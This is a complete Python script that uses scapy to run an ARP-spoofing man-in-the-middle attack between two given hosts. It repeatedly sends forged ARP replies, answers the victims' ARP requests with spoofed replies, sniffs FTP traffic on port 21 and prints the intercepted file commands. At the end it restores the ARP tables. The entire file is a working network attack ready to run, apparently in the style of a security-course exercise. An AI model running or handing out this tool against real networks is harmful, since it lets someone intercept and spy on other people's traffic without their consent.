#!/usr/bin/env python3
import sys, time, signal, threading, re, ipaddress
sys.stdout.reconfigure(line_buffering=True)
from scapy.all import Ether, ARP, sendp, sniff, get_if_hwaddr

def validate_ipv4(addr):
    try:
        ip = ipaddress.ip_address(addr)
        if ip.version != 4:
            raise ValueError
        return str(ip)
    except ValueError:
        print(f"Error: '{addr}' is not a valid IPv4 address.")
        sys.exit(1)

def validate_mac(addr):
    if not re.fullmatch(r'([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}', addr):
        print(f"Error: '{addr}' is not a valid MAC address (expected XX:XX:XX:XX:XX:XX).")
        sys.exit(1)
    return addr.lower()

if len(sys.argv) < 5:
    print(f"Usage: {sys.argv[0]} <IP-src> <MAC-src> <IP-target> <MAC-target> [-v]")
    sys.exit(1)

ip_src     = validate_ipv4(sys.argv[1])
mac_src    = validate_mac(sys.argv[2])
ip_target  = validate_ipv4(sys.argv[3])
mac_target = validate_mac(sys.argv[4])
verbose = "-v" in sys.argv
running = True

def poison():
    while running:
        sendp(Ether(dst=mac_src)    / ARP(op=2, pdst=ip_src,    hwdst=mac_src,    psrc=ip_target), verbose=0)
        sendp(Ether(dst=mac_target) / ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_src),    verbose=0)
        time.sleep(2)

def restore():
    print("\n[*] Restoring ARP tables...")
    for _ in range(3):
        sendp(Ether(dst=mac_src)    / ARP(op=2, pdst=ip_src,    hwdst=mac_src,    psrc=ip_target, hwsrc=mac_target), verbose=0)
        sendp(Ether(dst=mac_target) / ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_src,    hwsrc=mac_src),    verbose=0)
    print("[*] Done.")

def handle_packet(pkt):
    if pkt.haslayer(ARP) and pkt[ARP].op == 1:
        arp = pkt[ARP]
        if arp.pdst in (ip_src, ip_target):
            sendp(Ether(dst=arp.hwsrc) / ARP(op=2, pdst=arp.psrc, hwdst=arp.hwsrc, psrc=arp.pdst), verbose=0)
        return
    # Skip forwarded packets (outgoing) — only process what arrives TO us
    if pkt.haslayer(Ether) and pkt[Ether].dst.lower() != my_mac.lower():
        return
    if not pkt.haslayer("TCP"): return
    tcp = pkt["TCP"]
    if tcp.dport != 21 and tcp.sport != 21: return
    payload = bytes(tcp.payload).decode(errors="ignore").strip()
    if not payload: return
    cmd = payload.split()[0].upper()
    if cmd in ("RETR", "STOR", "DELE", "MKD", "RMD", "CWD", "RNFR", "RNTO", "LIST", "NLST"):
        print(f"[FTP] {cmd} {' '.join(payload.split()[1:])}")
    elif verbose:
        print(f"[FTP] {payload}")

def signal_handler(s, f):
    global running
    running = False

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

my_mac = get_if_hwaddr("eth0")

print(f"[*] ARP poisoning: {ip_src} <-> {ip_target}  (Ctrl+C to stop)")
threading.Thread(target=poison, daemon=True).start()
sniff(filter="arp or tcp port 21", prn=handle_packet, store=0, stop_filter=lambda p: not running, timeout=None)
restore()
